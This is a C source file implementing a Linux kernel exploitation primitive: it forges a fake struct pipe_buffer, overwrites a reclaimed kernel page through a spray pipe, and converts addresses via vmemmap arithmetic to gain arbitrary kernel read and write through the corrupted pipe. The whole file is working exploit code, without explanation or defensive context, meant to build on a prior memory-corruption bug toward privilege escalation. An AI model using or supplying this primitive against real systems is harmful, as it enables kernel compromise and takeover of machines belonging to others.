#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/ioctl.h>

typedef uint64_t usize;

/**
 * Mirror of the kernel's struct pipe_buffer.
 * Fields might need adjustment based on kernel version.
 */
struct pipe_buffer_t {
    unsigned long page;
    unsigned int offset, len;
    unsigned long ops;
    unsigned int flags;
    unsigned long private;
};

typedef struct {
    int pipe_fds[2];     // Pipe whose buffer is corrupted
    usize vmem_base;     // Base of vmemmap for addr -> struct page conversion
    struct pipe_buffer_t saved_template; // Valid template leaked from kernel
    int buffer_offset;   // Byte offset of the target pipe_buffer within the reclaimed page
} pipe_buffer_rw_ctx_t;

/**
 * Translates a virtual address to its corresponding struct page pointer.
 * 
 * NOTE: The implementation of this conversion is architecture and 
 * kernel-configuration dependent.
 */
static usize addr_to_page(usize addr, usize vmem_base) {
    // Standard arm64/x86_64 vmemmap conversion
    return ((addr >> 12) << 6) + vmem_base;
}

/**
 * Initialize the pipe buffer R/W context.
 */
int init_pipe_buffer_rw(pipe_buffer_rw_ctx_t *ctx, int pipe_r, int pipe_w, 
                        usize vmem_base, struct pipe_buffer_t *template, 
                        int buffer_offset) {
    ctx->pipe_fds[0] = pipe_r;
    ctx->pipe_fds[1] = pipe_w;
    ctx->vmem_base = vmem_base;
    ctx->buffer_offset = buffer_offset;
    memcpy(&ctx->saved_template, template, sizeof(struct pipe_buffer_t));
    return 0;
}

/**
 * Perform an arbitrary read.
 * 
 * @param spray_write_fd The FD used to overwrite the reclaimed page (e.g., write end of spray pipe).
 * @param addr Target kernel virtual address.
 * @param buf Destination buffer in userspace.
 * @param count Number of bytes to read.
 */
ssize_t execute_pipe_buffer_read(pipe_buffer_rw_ctx_t *ctx, int spray_write_fd, 
                                usize addr, void *buf, size_t count) {
    struct pipe_buffer_t fake_buf;
    uint8_t page_data[4096];

    // 1. Prepare fake pipe_buffer
    memcpy(&fake_buf, &ctx->saved_template, sizeof(struct pipe_buffer_t));
    fake_buf.page = addr_to_page(addr, ctx->vmem_base);
    fake_buf.offset = addr & 0xfff;
    fake_buf.len = count;

    // 2. Overwrite the kernel object via spray page
    // We assume the caller provides the FD to the reclaimed page.
    memset(page_data, 0, 4096);
    memcpy(page_data + ctx->buffer_offset, &fake_buf, sizeof(struct pipe_buffer_t));
    
    if (write(spray_write_fd, page_data, 4096) != 4096) {
        return -1;
    }

    // 3. Trigger the read from the corrupted pipe
    return read(ctx->pipe_fds[0], buf, count);
}

/**
 * Perform an arbitrary write.
 */
ssize_t execute_pipe_buffer_write(pipe_buffer_rw_ctx_t *ctx, int spray_write_fd, 
                                 usize addr, const void *buf, size_t count) {
    struct pipe_buffer_t fake_buf;
    uint8_t page_data[4096];

    // 1. Prepare fake pipe_buffer
    memcpy(&fake_buf, &ctx->saved_template, sizeof(struct pipe_buffer_t));
    fake_buf.page = addr_to_page(addr, ctx->vmem_base);
    fake_buf.offset = addr & 0xfff;
    fake_buf.len = 0; // len=0 makes the next write use this buffer

    // 2. Overwrite the kernel object
    memset(page_data, 0, 4096);
    memcpy(page_data + ctx->buffer_offset, &fake_buf, sizeof(struct pipe_buffer_t));

    if (write(spray_write_fd, page_data, 4096) != 4096) {
        return -1;
    }

    // 3. Trigger the write to the corrupted pipe
    return write(ctx->pipe_fds[1], buf, count);
}
